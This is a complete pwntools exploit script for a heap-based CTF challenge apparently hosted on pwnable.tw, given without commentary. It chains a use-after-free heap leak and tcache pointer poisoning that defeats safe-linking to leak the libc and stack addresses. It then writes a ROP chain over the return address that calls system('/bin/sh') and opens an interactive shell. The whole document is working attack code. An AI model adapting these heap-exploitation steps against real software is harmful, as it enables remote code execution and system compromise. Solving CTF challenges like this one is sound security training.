#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall_patched")
libc = elf.libc

local = True 
if local:
    p = process("./chall_patched")
    gdb.attach(p,'''b*main+778\nc''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./chall_patched', checksec=False)


def create(idx, size, data):
    p.sendlineafter(b"[*] choice :", b"0")
    p.sendlineafter(b"[*] Index : ", str(idx))
    p.sendlineafter(b"[*] Size : ", str(size))
    p.sendafter(b"[*] Data : ", data)
    print("$ Create")

def free(idx):
    p.sendlineafter(b"[*] choice :", b"1")
    p.sendlineafter(b"[*] Index : ", str(idx))
    print("$ Free")

def show(idx):
    p.sendlineafter(b"[*] choice :", b"2")
    p.sendlineafter(b"[*] Index : ", str(idx))
    print("$ Show")

def edit(idx, data):
    p.sendlineafter(b"[*] choice :", b"3")
    p.sendlineafter(b"[*] Index : ", str(idx))
    p.sendafter(b"[*] Data : ", data)
    print("$ Edit")

print("##################")
print("# LEAK_HEAP_ADDR #")
print("##################")

payload = p64(0)*3 + p64(0x501)
create(0, 0xf8, payload)

payload = (p64(0x0)+p64(0x101)) * 3
for i in range(5):
    create(0, 0xf8, payload)
create(1, 0xf8, b"1")
free(0)
show(0)
heap = int.from_bytes(p.recv(5), "little") << 4*3 
print("[+]Heap_base:    ", hex(heap))


print("##################")
print("# LEAK_LIBC_ADDR #")
print("##################")

payload=p64((heap+0x8a0)>>12^(heap+0x2c0))
free(1)
edit(1, payload)
create(0, 0xf8, b"a"*0xf8)
create(0, 0xf8, b"b"*0xf8)
free(0)
show(0)
libc.address = int.from_bytes(p.recv(6), "little")  - 2202848
print("[+]Libc_base:    ", hex(libc.address))

print("###################")
print("# LEAK_STACK_ADDR #")
print("###################")

create(0, 0x28, b"a")
create(1, 0x28, b"a")
free(0)
free(1)
payload = p64(((heap+0x330)>>12)^(libc.sym['environ']-0x10))
edit(1, payload)
create(0, 0x28, b"A"*0x10)
create(0, 0x28, b"B"*0x10)
show(0)
p.recvuntil(b"B"*0x10)
stack       = int.from_bytes(p.recv(6), "little")
ret_addr    = stack - 288
print("[+]Stack:   ", hex(stack))
print("[+]Ret_addr:     ", hex(ret_addr))

print("###################")
print("# RET_2_ROP_CHAIN #")
print("###################")

create(0, 0x48, b"a")
create(1, 0x48, b"a")
free(0)
free(1)

payload = p64(((heap+0x370)>>12)^(ret_addr-0x8))
edit(1, payload)

ret = libc.address + 0x0000000000029cd6
pop_rdi_ret = libc.address + 0x000000000002a3e5

payload = flat(
    p64(0xabcdef),
    ret,
    pop_rdi_ret,
    next(libc.search(b'/bin/sh')),
    libc.sym['system']
    )

create(0, 0x48, b"A"*0x10)
create(0, 0x48, payload)

p.sendlineafter(b"[*] choice :", b"4")
'''
'''

p.interactive()